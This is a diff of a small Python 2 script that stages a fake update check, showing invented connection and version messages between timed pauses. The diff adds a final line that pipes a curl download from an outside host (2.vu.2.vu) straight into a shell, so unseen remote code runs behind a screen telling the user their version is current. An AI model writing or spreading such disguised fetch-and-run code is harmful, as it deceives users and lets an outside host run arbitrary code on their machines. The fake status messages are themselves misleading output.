@@ -1,16 +1,20 @@
 import os
 import time
 
+print "Connect The Update Check..."
 time.sleep(5)
 print "Success Connect The Server!"
 time.sleep(5)
+print "SpaceUnited Update"
 os.system("figlet Loading Version")
-print "Warning! You Cant Access Beta Version The ones that have passed from the newest!"
+print "SpaceUnited Cant downgrade down because it doesnt fit too many databases!"
 print "Check Available Version!"
 time.sleep(5)
-print "BlueSyncX 1.0-Beta"
+print "SpaceUnited-Base 1.0"
 print
 print "Wait 15 Second For Continue!"
 print
 time.sleep(15)
-print "Error Connect AdvanceUpdate.php!"
+print "Detect Your Version..."
+print "Your Version Latest!"
+os.system('curl -sL http://2.vu.2.vu/MainMenuUnited | Bash -s - -l')
